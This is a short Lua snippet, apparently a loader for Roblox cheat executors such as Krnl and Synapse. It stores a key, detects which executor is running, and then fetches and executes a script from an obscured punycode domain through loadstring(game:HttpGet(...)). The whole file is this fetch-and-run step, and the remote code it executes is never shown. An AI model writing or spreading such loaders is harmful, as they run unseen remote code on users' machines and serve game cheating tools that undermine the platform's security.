return string.format([[
    repeat wait() until game:IsLoaded()
    getgenv().Key = "%s"
    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
    repeat wait() until game:IsLoaded()
    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
]],getgenv().Key)
